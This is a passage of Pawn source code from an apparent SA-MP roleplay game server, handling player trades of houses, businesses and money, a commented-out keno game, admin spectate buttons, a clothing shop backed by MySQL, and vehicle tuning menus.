						if(transfer_casa == 2)
						{
							PlayerInfo[playerid][pPhousekey] = 999;
							Update(playerid, pPhousekeyx);
							TransferaItem(playerid, id_jucator, 2, casa_trade[playerid]);
							casa_trade[playerid] = 0;
						}
						if(transfer_casa == 3)
						{
							PlayerInfo[id_jucator][pPhousekey] = 999;
							Update(id_jucator, pPhousekeyx);
							TransferaItem(id_jucator, playerid, 2, casa_trade[id_jucator]);
							casa_trade[id_jucator] = 0;
						}
					}
					if(afacere_trade[playerid] > 0 || afacere_trade[id_jucator] > 0)
					{
						new transfer_afacere = 0;
						// 1 = reciproc.
						// 2 = playerid la id.
						// 3 = id la playerid.
						// 0 = eroare.
						if(afacere_trade[playerid] > 0 && afacere_trade[id_jucator] > 0 && transfer_afacere == 0) { transfer_afacere = 1; }
						if(afacere_trade[playerid] > 0 && transfer_afacere == 0) { transfer_afacere = 2; }
						if(afacere_trade[id_jucator] > 0 && transfer_afacere == 0) { transfer_afacere = 3; }
						if(transfer_afacere == 1)
						{
							PlayerInfo[playerid][pPbiskey] = 255;
							PlayerInfo[id_jucator][pPbiskey] = 255;
							Update(playerid, pPbiskeyx);
							Update(id_jucator, pPbiskeyx);
							TransferaItem(playerid, id_jucator, 3, afacere_trade[playerid]);
							TransferaItem(id_jucator, playerid, 3, afacere_trade[id_jucator]);
							afacere_trade[playerid] = 0;
							afacere_trade[id_jucator] = 0;
						}
						if(transfer_afacere == 2)
						{
							PlayerInfo[playerid][pPbiskey] = 255;
							Update(playerid, pPbiskeyx);
							TransferaItem(playerid, id_jucator, 3, afacere_trade[playerid]);
							afacere_trade[playerid] = 0;
						}
						if(transfer_afacere == 3)
						{
							PlayerInfo[id_jucator][pPbiskey] = 255;
							Update(id_jucator, pPbiskeyx);
							TransferaItem(id_jucator, playerid, 3, afacere_trade[id_jucator]);
							afacere_trade[id_jucator] = 0;
						}
					}
					if(suma_bani_trade[playerid] > 0)
					{
						GivePlayerCash(playerid, -suma_bani_trade[playerid]);
						Update(playerid, pCashx);
						TransferaItem(playerid, id_jucator, 4, suma_bani_trade[playerid]);
						suma_bani_trade[playerid] = 0;
					}
					if(suma_bani_trade[id_jucator] > 0)
					{
						GivePlayerCash(id_jucator, -suma_bani_trade[id_jucator]);
						Update(id_jucator, pCashx);
						TransferaItem(id_jucator, playerid, 4, suma_bani_trade[id_jucator]);
						suma_bani_trade[id_jucator] = 0;
					}
					StergeIteme(playerid, id_jucator);
					StergeIteme(id_jucator, playerid);
				}				
			}
		}
		else
		{
			Afacere(playerid, id_jucator, false);
		}
	}
	/*if(playertextid == KenoTD[110])
	{
		if(timerkeno[playerid] > 0) return 1;
		if(BileSelectate[playerid] < 2) return SCM(playerid, COLOR_ERROR, "Este nevoie sa selectezi minim doua numere.");
		if(GetPlayerCash(playerid) < MizaKeno[playerid]) return SCM(playerid, COLOR_ERROR, "You do not have enough money.");
		timerkeno[playerid] = 15;
		for(new i = 0; i < 15; i++) numerekeno[playerid][i] = 0;
		for(new x = 29; x <= 88; x++)
		{
			if(BilaSelectata[playerid][x-29] == 1) PlayerTextDrawColor(playerid, KenoTD[x], -5963521);
			else if(BilaSelectata[playerid][x-29] == 0) PlayerTextDrawColor(playerid, KenoTD[x], 1113407743);
			PlayerTextDrawShow(playerid, KenoTD[x]);
		}
	}
	if(MizaKeno[playerid] > 0)
	{
		if(timerkeno[playerid] > 0) return 1;
		for(new x = 29; x <= 88; x++)
		{
			if(playertextid == KenoTD[x])
			{
				if(BilaSelectata[playerid][x-29] == 0 && BileSelectate[playerid] < 10) PlayerTextDrawColor(playerid, KenoTD[x], -5963521),BilaSelectata[playerid][x-29]=1,BileSelectate[playerid]++;
				else if(BilaSelectata[playerid][x-29] == 1 && BileSelectate[playerid] > 0) PlayerTextDrawColor(playerid, KenoTD[x], 1113407743),BilaSelectata[playerid][x-29]=0,BileSelectate[playerid]--;
				PlayerTextDrawShow(playerid, KenoTD[x]);
				if(BileSelectate[playerid] > 10) BileSelectate[playerid] = 10;
				if(BileSelectate[playerid] < 0) BileSelectate[playerid] = 0;
				format(MGLOBAL, sizeof(MGLOBAL), "bile_selectate:_%d",BileSelectate[playerid]);
				PlayerTextDrawSetString(playerid, KenoTD[111], MGLOBAL);
				for(new i2 = 18; i2 < 28; i2++) PlayerTextDrawHide(playerid, KenoTD[i2]);
				if(BileSelectate[playerid] >= 1)
				{
					format(MGLOBAL, sizeof(MGLOBAL), "1_-");
					PlayerTextDrawSetString(playerid, KenoTD[18], MGLOBAL);
					PlayerTextDrawShow(playerid, KenoTD[18]);
				}
				if(BileSelectate[playerid] > 1 && BileSelectate[playerid] <= 2)
				{
					format(MGLOBAL, sizeof(MGLOBAL), "2_$%s",FormatNumber(MizaKeno[playerid] * 2));
					PlayerTextDrawSetString(playerid, KenoTD[19], MGLOBAL);
					PlayerTextDrawShow(playerid, KenoTD[19]);
				}
				if(BileSelectate[playerid] > 2 && BileSelectate[playerid] <= 3)
				{
					format(MGLOBAL, sizeof(MGLOBAL), "2_$%s",FormatNumber(MizaKeno[playerid] * 2));
					PlayerTextDrawSetString(playerid, KenoTD[19], MGLOBAL);
					format(MGLOBAL, sizeof(MGLOBAL), "3_$%s",FormatNumber(MizaKeno[playerid] * 6));
					PlayerTextDrawSetString(playerid, KenoTD[20], MGLOBAL);
					for(new i = 1; i < 3; i++) PlayerTextDrawShow(playerid, KenoTD[i+18]);
				}
				if(BileSelectate[playerid] > 3 && BileSelectate[playerid] < 5)
				{
					format(MGLOBAL, sizeof(MGLOBAL), "2_-");
					PlayerTextDrawSetString(playerid, KenoTD[19], MGLOBAL);
					format(MGLOBAL, sizeof(MGLOBAL), "3_$%s",FormatNumber(MizaKeno[playerid] * 6));
					PlayerTextDrawSetString(playerid, KenoTD[20], MGLOBAL);
					format(MGLOBAL, sizeof(MGLOBAL), "4_$%s",FormatNumber(MizaKeno[playerid] * 8));
					PlayerTextDrawSetString(playerid, KenoTD[21], MGLOBAL);
					for(new i = 1; i <= 3; i++) PlayerTextDrawShow(playerid, KenoTD[i+18]);
				}
				if(BileSelectate[playerid] > 4 && BileSelectate[playerid] < 6)
				{
					format(MGLOBAL, sizeof(MGLOBAL), "2_-");
					PlayerTextDrawSetString(playerid, KenoTD[19], MGLOBAL);
					format(MGLOBAL, sizeof(MGLOBAL), "3_-");
					PlayerTextDrawSetString(playerid, KenoTD[20], MGLOBAL);
					format(MGLOBAL, sizeof(MGLOBAL), "4_$%s",FormatNumber(MizaKeno[playerid] * 8));
					PlayerTextDrawSetString(playerid, KenoTD[21], MGLOBAL);
					format(MGLOBAL, sizeof(MGLOBAL), "5_$%s",FormatNumber(MizaKeno[playerid] * 12));
					PlayerTextDrawSetString(playerid, KenoTD[22], MGLOBAL);
					for(new i = 1; i <= 4; i++) PlayerTextDrawShow(playerid, KenoTD[i+18]);
				}
				if(BileSelectate[playerid] >= 6)
				{
					format(MGLOBAL, sizeof(MGLOBAL), "2_-");
					PlayerTextDrawSetString(playerid, KenoTD[19], MGLOBAL);
					format(MGLOBAL, sizeof(MGLOBAL), "3_-");
					PlayerTextDrawSetString(playerid, KenoTD[20], MGLOBAL);
					format(MGLOBAL, sizeof(MGLOBAL), "4_$%s",FormatNumber(MizaKeno[playerid] * 8));
					PlayerTextDrawSetString(playerid, KenoTD[21], MGLOBAL);
					format(MGLOBAL, sizeof(MGLOBAL), "5_$%s",FormatNumber(MizaKeno[playerid] * 12));
					PlayerTextDrawSetString(playerid, KenoTD[22], MGLOBAL);
					format(MGLOBAL, sizeof(MGLOBAL), "6_$%s",FormatNumber(MizaKeno[playerid] * 14));
					PlayerTextDrawSetString(playerid, KenoTD[23], MGLOBAL);
					if(BileSelectate[playerid] > 6)
					{
						format(MGLOBAL, sizeof(MGLOBAL), "7_$%s",FormatNumber(MizaKeno[playerid] * 25));
						PlayerTextDrawSetString(playerid, KenoTD[24], MGLOBAL);
					}
					if(BileSelectate[playerid] > 7)
					{					
						format(MGLOBAL, sizeof(MGLOBAL), "8_$%s",FormatNumber(MizaKeno[playerid] * 45));
						PlayerTextDrawSetString(playerid, KenoTD[25], MGLOBAL);
					}
					if(BileSelectate[playerid] > 8)
					{
						format(MGLOBAL, sizeof(MGLOBAL), "9_$%s",FormatNumber(MizaKeno[playerid] * 75));
						PlayerTextDrawSetString(playerid, KenoTD[26], MGLOBAL);
					}
					if(BileSelectate[playerid] > 9)
					{
						format(MGLOBAL, sizeof(MGLOBAL), "10_$%s",FormatNumber(MizaKeno[playerid] * 99));
						PlayerTextDrawSetString(playerid, KenoTD[27], MGLOBAL);
					}	
					for(new i = 1; i < BileSelectate[playerid]; i++) PlayerTextDrawShow(playerid, KenoTD[i+18]);
				}
			}
		}
		for(new x = 29; x <= 88; x++)
		{
			if(BilaSelectata[playerid][x-29] == 1) PlayerTextDrawColor(playerid, KenoTD[x], -5963521);
			else if(BilaSelectata[playerid][x-29] == 0) PlayerTextDrawColor(playerid, KenoTD[x], 1113407743);
			PlayerTextDrawShow(playerid, KenoTD[x]);
		}
	}	
	if(playertextid == KenoTD[107])
	{
		if(timerkeno[playerid] > 0) return 1;
		MizaKeno[playerid]-=10000;
		if(MizaKeno[playerid] < 10000) MizaKeno[playerid] = 10000000;
		format(MGLOBAL, sizeof(MGLOBAL), "$%s",FormatNumber(MizaKeno[playerid]));
		PlayerTextDrawSetString(playerid, KenoTD[109], MGLOBAL);
		PlayerTextDrawShow(playerid, KenoTD[109]);
		for(new i2 = 18; i2 < 28; i2++) PlayerTextDrawHide(playerid, KenoTD[i2]);
		if(BileSelectate[playerid] >= 1)
		{
			format(MGLOBAL, sizeof(MGLOBAL), "1_-");
			PlayerTextDrawSetString(playerid, KenoTD[18], MGLOBAL);
			PlayerTextDrawShow(playerid, KenoTD[18]);
		}
		if(BileSelectate[playerid] > 1 && BileSelectate[playerid] <= 2)
		{
			format(MGLOBAL, sizeof(MGLOBAL), "2_$%s",FormatNumber(MizaKeno[playerid] * 2));
			PlayerTextDrawSetString(playerid, KenoTD[19], MGLOBAL);
			PlayerTextDrawShow(playerid, KenoTD[19]);
		}
		if(BileSelectate[playerid] > 2 && BileSelectate[playerid] <= 3)
		{
			format(MGLOBAL, sizeof(MGLOBAL), "2_$%s",FormatNumber(MizaKeno[playerid] * 2));
			PlayerTextDrawSetString(playerid, KenoTD[19], MGLOBAL);
			format(MGLOBAL, sizeof(MGLOBAL), "3_$%s",FormatNumber(MizaKeno[playerid] * 6));
			PlayerTextDrawSetString(playerid, KenoTD[20], MGLOBAL);
			for(new i = 1; i < 3; i++) PlayerTextDrawShow(playerid, KenoTD[i+18]);
		}
		if(BileSelectate[playerid] > 3 && BileSelectate[playerid] < 5)
		{
			format(MGLOBAL, sizeof(MGLOBAL), "2_-");
			PlayerTextDrawSetString(playerid, KenoTD[19], MGLOBAL);
			format(MGLOBAL, sizeof(MGLOBAL), "3_$%s",FormatNumber(MizaKeno[playerid] * 6));
			PlayerTextDrawSetString(playerid, KenoTD[20], MGLOBAL);
			format(MGLOBAL, sizeof(MGLOBAL), "4_$%s",FormatNumber(MizaKeno[playerid] * 8));
			PlayerTextDrawSetString(playerid, KenoTD[21], MGLOBAL);
			for(new i = 1; i <= 3; i++) PlayerTextDrawShow(playerid, KenoTD[i+18]);
		}
		if(BileSelectate[playerid] > 4 && BileSelectate[playerid] < 6)
		{
			format(MGLOBAL, sizeof(MGLOBAL), "2_-");
			PlayerTextDrawSetString(playerid, KenoTD[19], MGLOBAL);
			format(MGLOBAL, sizeof(MGLOBAL), "3_-");
			PlayerTextDrawSetString(playerid, KenoTD[20], MGLOBAL);
			format(MGLOBAL, sizeof(MGLOBAL), "4_$%s",FormatNumber(MizaKeno[playerid] * 8));
			PlayerTextDrawSetString(playerid, KenoTD[21], MGLOBAL);
			format(MGLOBAL, sizeof(MGLOBAL), "5_$%s",FormatNumber(MizaKeno[playerid] * 12));
			PlayerTextDrawSetString(playerid, KenoTD[22], MGLOBAL);
			for(new i = 1; i <= 4; i++) PlayerTextDrawShow(playerid, KenoTD[i+18]);
		}
		if(BileSelectate[playerid] >= 6)
		{
			format(MGLOBAL, sizeof(MGLOBAL), "2_-");
			PlayerTextDrawSetString(playerid, KenoTD[19], MGLOBAL);
			format(MGLOBAL, sizeof(MGLOBAL), "3_-");
			PlayerTextDrawSetString(playerid, KenoTD[20], MGLOBAL);
			format(MGLOBAL, sizeof(MGLOBAL), "4_$%s",FormatNumber(MizaKeno[playerid] * 8));
			PlayerTextDrawSetString(playerid, KenoTD[21], MGLOBAL);
			format(MGLOBAL, sizeof(MGLOBAL), "5_$%s",FormatNumber(MizaKeno[playerid] * 12));
			PlayerTextDrawSetString(playerid, KenoTD[22], MGLOBAL);
			format(MGLOBAL, sizeof(MGLOBAL), "6_$%s",FormatNumber(MizaKeno[playerid] * 14));
			PlayerTextDrawSetString(playerid, KenoTD[23], MGLOBAL);
			if(BileSelectate[playerid] > 6)
			{
				format(MGLOBAL, sizeof(MGLOBAL), "7_$%s",FormatNumber(MizaKeno[playerid] * 25));
				PlayerTextDrawSetString(playerid, KenoTD[24], MGLOBAL);
			}
			if(BileSelectate[playerid] > 7)
			{					
				format(MGLOBAL, sizeof(MGLOBAL), "8_$%s",FormatNumber(MizaKeno[playerid] * 45));
				PlayerTextDrawSetString(playerid, KenoTD[25], MGLOBAL);
			}
			if(BileSelectate[playerid] > 8)
			{
				format(MGLOBAL, sizeof(MGLOBAL), "9_$%s",FormatNumber(MizaKeno[playerid] * 75));
				PlayerTextDrawSetString(playerid, KenoTD[26], MGLOBAL);
			}
			if(BileSelectate[playerid] > 9)
			{
				format(MGLOBAL, sizeof(MGLOBAL), "10_$%s",FormatNumber(MizaKeno[playerid] * 99));
				PlayerTextDrawSetString(playerid, KenoTD[27], MGLOBAL);
			}	
			for(new i = 1; i < BileSelectate[playerid]; i++) PlayerTextDrawShow(playerid, KenoTD[i+18]);
		}	
	}
	if(playertextid == KenoTD[108])
	{
		if(timerkeno[playerid] > 0) return 1;
		MizaKeno[playerid]+=10000;
		if(MizaKeno[playerid] > 10000000) MizaKeno[playerid] = 10000;
		format(MGLOBAL, sizeof(MGLOBAL), "$%s",FormatNumber(MizaKeno[playerid]));
		PlayerTextDrawSetString(playerid, KenoTD[109], MGLOBAL);
		PlayerTextDrawShow(playerid, KenoTD[109]);
		for(new i2 = 18; i2 < 28; i2++) PlayerTextDrawHide(playerid, KenoTD[i2]);
		if(BileSelectate[playerid] >= 1)
		{
			format(MGLOBAL, sizeof(MGLOBAL), "1_-");
			PlayerTextDrawSetString(playerid, KenoTD[18], MGLOBAL);
			PlayerTextDrawShow(playerid, KenoTD[18]);
		}
		if(BileSelectate[playerid] > 1 && BileSelectate[playerid] <= 2)
		{
			format(MGLOBAL, sizeof(MGLOBAL), "2_$%s",FormatNumber(MizaKeno[playerid] * 2));
			PlayerTextDrawSetString(playerid, KenoTD[19], MGLOBAL);
			PlayerTextDrawShow(playerid, KenoTD[19]);
		}
		if(BileSelectate[playerid] > 2 && BileSelectate[playerid] <= 3)
		{
			format(MGLOBAL, sizeof(MGLOBAL), "2_$%s",FormatNumber(MizaKeno[playerid] * 2));
			PlayerTextDrawSetString(playerid, KenoTD[19], MGLOBAL);
			format(MGLOBAL, sizeof(MGLOBAL), "3_$%s",FormatNumber(MizaKeno[playerid] * 6));
			PlayerTextDrawSetString(playerid, KenoTD[20], MGLOBAL);
			for(new i = 1; i < 3; i++) PlayerTextDrawShow(playerid, KenoTD[i+18]);
		}
		if(BileSelectate[playerid] > 3 && BileSelectate[playerid] < 5)
		{
			format(MGLOBAL, sizeof(MGLOBAL), "2_-");
			PlayerTextDrawSetString(playerid, KenoTD[19], MGLOBAL);
			format(MGLOBAL, sizeof(MGLOBAL), "3_$%s",FormatNumber(MizaKeno[playerid] * 6));
			PlayerTextDrawSetString(playerid, KenoTD[20], MGLOBAL);
			format(MGLOBAL, sizeof(MGLOBAL), "4_$%s",FormatNumber(MizaKeno[playerid] * 8));
			PlayerTextDrawSetString(playerid, KenoTD[21], MGLOBAL);
			for(new i = 1; i <= 3; i++) PlayerTextDrawShow(playerid, KenoTD[i+18]);
		}
		if(BileSelectate[playerid] > 4 && BileSelectate[playerid] < 6)
		{
			format(MGLOBAL, sizeof(MGLOBAL), "2_-");
			PlayerTextDrawSetString(playerid, KenoTD[19], MGLOBAL);
			format(MGLOBAL, sizeof(MGLOBAL), "3_-");
			PlayerTextDrawSetString(playerid, KenoTD[20], MGLOBAL);
			format(MGLOBAL, sizeof(MGLOBAL), "4_$%s",FormatNumber(MizaKeno[playerid] * 8));
			PlayerTextDrawSetString(playerid, KenoTD[21], MGLOBAL);
			format(MGLOBAL, sizeof(MGLOBAL), "5_$%s",FormatNumber(MizaKeno[playerid] * 12));
			PlayerTextDrawSetString(playerid, KenoTD[22], MGLOBAL);
			for(new i = 1; i <= 4; i++) PlayerTextDrawShow(playerid, KenoTD[i+18]);
		}
		if(BileSelectate[playerid] >= 6)
		{
			format(MGLOBAL, sizeof(MGLOBAL), "2_-");
			PlayerTextDrawSetString(playerid, KenoTD[19], MGLOBAL);
			format(MGLOBAL, sizeof(MGLOBAL), "3_-");
			PlayerTextDrawSetString(playerid, KenoTD[20], MGLOBAL);
			format(MGLOBAL, sizeof(MGLOBAL), "4_$%s",FormatNumber(MizaKeno[playerid] * 8));
			PlayerTextDrawSetString(playerid, KenoTD[21], MGLOBAL);
			format(MGLOBAL, sizeof(MGLOBAL), "5_$%s",FormatNumber(MizaKeno[playerid] * 12));
			PlayerTextDrawSetString(playerid, KenoTD[22], MGLOBAL);
			format(MGLOBAL, sizeof(MGLOBAL), "6_$%s",FormatNumber(MizaKeno[playerid] * 14));
			PlayerTextDrawSetString(playerid, KenoTD[23], MGLOBAL);
			if(BileSelectate[playerid] > 6)
			{
				format(MGLOBAL, sizeof(MGLOBAL), "7_$%s",FormatNumber(MizaKeno[playerid] * 25));
				PlayerTextDrawSetString(playerid, KenoTD[24], MGLOBAL);
			}
			if(BileSelectate[playerid] > 7)
			{					
				format(MGLOBAL, sizeof(MGLOBAL), "8_$%s",FormatNumber(MizaKeno[playerid] * 45));
				PlayerTextDrawSetString(playerid, KenoTD[25], MGLOBAL);
			}
			if(BileSelectate[playerid] > 8)
			{
				format(MGLOBAL, sizeof(MGLOBAL), "9_$%s",FormatNumber(MizaKeno[playerid] * 75));
				PlayerTextDrawSetString(playerid, KenoTD[26], MGLOBAL);
			}
			if(BileSelectate[playerid] > 9)
			{
				format(MGLOBAL, sizeof(MGLOBAL), "10_$%s",FormatNumber(MizaKeno[playerid] * 99));
				PlayerTextDrawSetString(playerid, KenoTD[27], MGLOBAL);
			}	
			for(new i = 1; i < BileSelectate[playerid]; i++) PlayerTextDrawShow(playerid, KenoTD[i+18]);
		}	
	}*/
	if(playertextid == SpecTD[5]) SCM(playerid, -1, "/kick <Name/Playerid> <reason>");
	if(playertextid == SpecTD[6]) SCM(playerid, -1, "/ajail <Name/Playerid> <Minutes> <reason>");
	if(playertextid == SpecTD[7]) SCM(playerid, -1, "/ban <Name/Playerid> <days(0=permanent)> <reason>");
	if(playertextid == SpecTD[8]) SCM(playerid, -1, "/warn <Name/Playerid> <reason>");
	if(playertextid == SpecTD[9])
	{
		ShowPlayerDialog(playerid, DIALOG_SpecConfirmare, DIALOG_STYLE_MSGBOX, "Server: Confirmation jail ", " Are you sure you want to close the player in jail?", "Yes", "No");
	}
	if(playertextid == SpecTD[10])
	{
		ShowPlayerDialog(playerid, DIALOG_SpecConfirmare+1, DIALOG_STYLE_MSGBOX, "Server: Confirmation ban ", " Are you sure you want to ban the player for the use of codes?","Yes", "No");
	}
	if(playertextid == SkinTD[7])
	{
		if(CumparaSkin[playerid] == 2)
		{
			PlayerInfo[playerid][pModel] = SKINSELECTAT[SKINID[playerid]][playerid];
			mysql_format(SQL, string, sizeof(string), "UPDATE users SET `Model`='%d' WHERE ID='%d'", PlayerInfo[playerid][pModel], PlayerInfo[playerid][pSQLID]);
			mysql_tquery(SQL, string,"","");
			CumparaSkin[playerid] = 0;
			CancelSelectTextDraw(playerid);
			for(new i = 0; i < sizeof(SkinTD); i++) PlayerTextDrawHide(playerid, SkinTD[i]);
			SetCameraBehindPlayer(playerid);
			new id = InBussines[playerid];
			SetPlayerVirtualWorld(playerid, BizzInfo[id][bVirtual]);
			SetPlayerInterior(playerid, BizzInfo[id][bInterior]);
			SetPlayerPosEx(playerid, BizzInfo[id][bExitX], BizzInfo[id][bExitY], BizzInfo[id][bExitZ]);
			return 1;
		}
		if(GetPlayerCash(playerid) > PRETSKIN[SKINID[playerid]][playerid])
		{
			mysql_format(SQL, string, sizeof(string), "SELECT * FROM `skinurijucatori` WHERE `playerid`='%d'",PlayerInfo[playerid][pSQLID]);
			new Cache: verificare = mysql_query(SQL, string);
			new skinuri = cache_get_row_count();
			cache_delete(verificare);
			if(skinuri >= 10 && PlayerInfo[playerid][pVip] < 1) return SCM(playerid, COLOR_ERROR, "Already 10 skins in your closet.");
			mysql_format(SQL, string, sizeof(string), "SELECT * FROM `skinurijucatori` WHERE `playerid`='%d' AND `Model`='%d'",PlayerInfo[playerid][pSQLID],IDSKIN[SKINID[playerid]][playerid]);
			new Cache: verificare2 = mysql_query(SQL, string);
			new aredejaskin = cache_get_row_count();
			cache_delete(verificare2);
			if(aredejaskin > 0) return SCM(playerid, COLOR_ERROR, "Already this model clothes in your closet.");
			GivePlayerCash(playerid, -PRETSKIN[SKINID[playerid]][playerid]);
			format(string, sizeof(string), "You bought new clothes $%s, they were added to your closet of clothes (/clothes).",FormatNumber(PRETSKIN[SKINID[playerid]][playerid]));
			SCM(playerid, -1, string);
			CancelSelectTextDraw(playerid);
			for(new i = 0; i < sizeof(SkinTD); i++) PlayerTextDrawHide(playerid, SkinTD[i]);
			CumparaSkin[playerid] = 0;
			SetPlayerSkin(playerid, PlayerInfo[playerid][pModel]);
			mysql_format(SQL, string, sizeof(string), "INSERT INTO `skinurijucatori` (`Model`,`playerid`) VALUES ('%d','%d')",IDSKIN[SKINID[playerid]][playerid],PlayerInfo[playerid][pSQLID]);
			mysql_tquery(SQL, string, "", "");
			SetCameraBehindPlayer(playerid);
			new id = InBussines[playerid];
			SetPlayerVirtualWorld(playerid, BizzInfo[id][bVirtual]);
			SetPlayerInterior(playerid, BizzInfo[id][bInterior]);
			SetPlayerPosEx(playerid, BizzInfo[id][bExitX], BizzInfo[id][bExitY], BizzInfo[id][bExitZ]);
		}
		else return SCM(playerid, COLOR_ERROR, "You do not have enough money.");
	}
	if(playertextid == SkinTD[4])
	{
		if(CumparaSkin[playerid] == 2)
		{
			SKINID[playerid]--;
			if(SKINID[playerid] < 1) SKINID[playerid] = SkinuriDulap[playerid];
			format(string, sizeof(string), "%d",SKINSELECTAT[SKINID[playerid]][playerid]);
			PlayerTextDrawSetString(playerid, SkinTD[6], string);
			PlayerTextDrawShow(playerid, SkinTD[6]);
			SetPlayerSkin(playerid, SKINSELECTAT[SKINID[playerid]][playerid]);
			return 1;
		}
		SKINID[playerid]--;
		if(SKINID[playerid] < 1) SKINID[playerid] = Skinuri[playerid];
		format(string, sizeof(string), "Price:_$%s",FormatNumber(PRETSKIN[SKINID[playerid]][playerid]));
		PlayerTextDrawSetString(playerid, SkinTD[6], string);
		PlayerTextDrawShow(playerid, SkinTD[6]);
		SetPlayerSkin(playerid, IDSKIN[SKINID[playerid]][playerid]);
	}
	if(playertextid == SkinTD[5])
	{
		if(CumparaSkin[playerid] == 2)
		{
			SKINID[playerid]++;
			if(SKINID[playerid] > SkinuriDulap[playerid]) SKINID[playerid] = 1;
			format(string, sizeof(string), "%d",SKINSELECTAT[SKINID[playerid]][playerid]);
			PlayerTextDrawSetString(playerid, SkinTD[6], string);
			PlayerTextDrawShow(playerid, SkinTD[6]);
			SetPlayerSkin(playerid, SKINSELECTAT[SKINID[playerid]][playerid]);
			return 1;
		}
		SKINID[playerid]++;
		if(SKINID[playerid] > Skinuri[playerid]) SKINID[playerid] = 1;
		format(string, sizeof(string), "Price:_$%s",FormatNumber(PRETSKIN[SKINID[playerid]][playerid]));
		PlayerTextDrawSetString(playerid, SkinTD[6], string);
		PlayerTextDrawShow(playerid, SkinTD[6]);
		SetPlayerSkin(playerid, IDSKIN[SKINID[playerid]][playerid]);
	}
	if(playertextid == SkinTD[8])
	{
		SetCameraBehindPlayer(playerid);
		CancelSelectTextDraw(playerid);
		for(new i = 0; i < sizeof(SkinTD); i++) PlayerTextDrawHide(playerid, SkinTD[i]);
		CumparaSkin[playerid] = 0;
		SetPlayerSkin(playerid, PlayerInfo[playerid][pModel]);
		new id = InBussines[playerid];
		SetPlayerVirtualWorld(playerid, BizzInfo[id][bVirtual]);
		SetPlayerInterior(playerid, BizzInfo[id][bInterior]);
		SetPlayerPosEx(playerid, BizzInfo[id][bExitX], BizzInfo[id][bExitY], BizzInfo[id][bExitZ]);
	}
	if(playertextid == TuneTD[3])
	{
		if(CarInfo[OwnedVeh(GetPlayerVehicleID(playerid))][cNewEngine] > 0) return SCM(playerid, COLOR_ERROR, "You have already purchased upgrades for your vehicle engine.");
		new speed = MySQLCheckSpeed(CarInfo[OwnedVeh(GetPlayerVehicleID(playerid))][cModel]);
		format(MGLOBAL, sizeof(MGLOBAL), "(!) If you buy this product your vehicle engine will become much stronger.\nCurrent speed: %d KM/H\nSpeed new: %d KM/H\n(!) To buy engine click 'Buy', you need $10,000,000.",speed-21,speed);
		ShowPlayerDialog(playerid, DIALOG_MOTOR, DIALOG_STYLE_MSGBOX, "SERVER: Upgrade motor", MGLOBAL, "Buy", "Cancel");
	}
	if(playertextid == TuneTD[19])
	{
		InTunning[playerid] = 3;
		CancelSelectTextDraw(playerid);
	}
	if(playertextid == TuneTD[15])
	{
		//|----------cameradinspate----------|
		InterpolateCameraPos(playerid, 265.925750, -167.007904, 1071.765258, 261.750823, -175.495254, 1071.980346, 3000);
		InterpolateCameraLookAt(playerid, 262.974700, -170.593673, 1069.912231, 263.993316, -171.593124, 1069.802124, 3000);
		PlayerTextDrawSetString(playerid, TuningBuy[playerid][1], "CATEGORIE:_EXHAUSTS");
		new vehicleid = GetPlayerVehicleID(playerid);
		TPInfo[playerid][tID] = -1;
		for( new i = 0; i < MAX_COMPONENTS; i++ ) 
		{
			if( cTInfo[ i ][ cType ] == CARMODTYPE_EXHAUST ) 
			{
			    if( cTInfo[ i ][ cID ] == IsComponentidCompatible( GetVehicleModel( vehicleid ), cTInfo[ i ][ cID ] ) ) 
				{
				    TPInfo[ playerid ][ tID ] = i;
					break;
				}
			}
		}
		if( TPInfo[ playerid ][ tID ] == -1 ) return SCM( playerid, -1, "No parts compatible with your vehicle." );

		new cid = TPInfo[ playerid ][ tID ];
		TPInfo[ playerid ][ tType ] = CARMODTYPE_EXHAUST;
		TPInfo[ playerid ][ tPaintjob ] = false;

	    TogglePlayerControllable( playerid, false );
	    TuningTDControl( playerid, true );

	    format( globalstring, sizeof( globalstring ), "%s", cTInfo[ cid ][ cName ] );
		PlayerTextDrawSetString( playerid, TuningBuy[ playerid ][ 4 ], globalstring );

        AddVehicleComponent(vehicleid, cTInfo[ cid ][ cID ] );
		
		SelectTextDraw(playerid, 0xFF000000);
	}
	if(playertextid == TuneTD[13])
	{
		PlayerTextDrawSetString(playerid, TuningBuy[playerid][1], "CATEGORIE:_SPOILERS");
		ShowPlayerDialog(playerid, DIALOG_SPOILERE, DIALOG_STYLE_LIST, "SERVER: Spoilere", "Front Bumper\nRear Bumper\nRoof\nSpoilers\nSide Skirts", "Select", "CANCEL");
	}
	if(playertextid == TuneTD[11])
	{
		//|----------cameradeperateral----------|
		InterpolateCameraPos(playerid, 265.382598, -175.946472, 1071.898193, 266.331298, -169.223434, 1070.523071, 3000);
		InterpolateCameraLookAt(playerid, 262.792510, -172.247375, 1069.751586, 262.433868, -172.139846, 1069.380859, 3000);
		PlayerTextDrawSetString(playerid, TuningBuy[playerid][1], "CATEGORIE:_CAR_STEREO");
		new vehicleid = GetPlayerVehicleID(playerid);
		TPInfo[playerid][tID] = -1;
		for( new i = 0; i < MAX_COMPONENTS; i++ ) 
		{
			if( cTInfo[ i ][ cType ] == CARMODTYPE_STEREO ) 
			{
			    if( cTInfo[ i ][ cID ] == IsComponentidCompatible( GetVehicleModel( vehicleid ), cTInfo[ i ][ cID ] ) ) 
				{
					TPInfo[ playerid ][ tID ] = i;
					break;
				}
			}
		}
	    if( TPInfo[ playerid ][ tID ] == -1 ) return SCM( playerid, -1, "No parts compatible with your vehicle" );
		new cid = TPInfo[ playerid ][ tID ];
		TPInfo[ playerid ][ tType ] = CARMODTYPE_STEREO;
		TPInfo[ playerid ][ tPaintjob ] = false;

		TogglePlayerControllable( playerid, false );
	    TuningTDControl( playerid, true );

	    format( globalstring, sizeof( globalstring ), "%s", cTInfo[ cid ][ cName ] );
		PlayerTextDrawSetString( playerid, TuningBuy[ playerid ][ 4 ], globalstring );

        AddVehicleComponent( vehicleid, cTInfo[ cid ][ cID ] );

		SelectTextDraw( playerid, 0xFF000000);
	}
	if(playertextid == TuneTD[9])
	{
		//|----------cameradeperateral----------|
		InterpolateCameraPos(playerid, 265.382598, -175.946472, 1071.898193, 266.331298, -169.223434, 1070.523071, 3000);
		InterpolateCameraLookAt(playerid, 262.792510, -172.247375, 1069.751586, 262.433868, -172.139846, 1069.380859, 3000);
		PlayerTextDrawSetString(playerid, TuningBuy[playerid][1], "CATEGORIE:_HYDRAULICS");
		new vehicleid = GetPlayerVehicleID(playerid);
		TPInfo[playerid][tID] = -1;
		for( new i = 0; i < MAX_COMPONENTS; i++ ) 
		{
			if( cTInfo[ i ][ cType ] == CARMODTYPE_HYDRAULICS ) 
			{
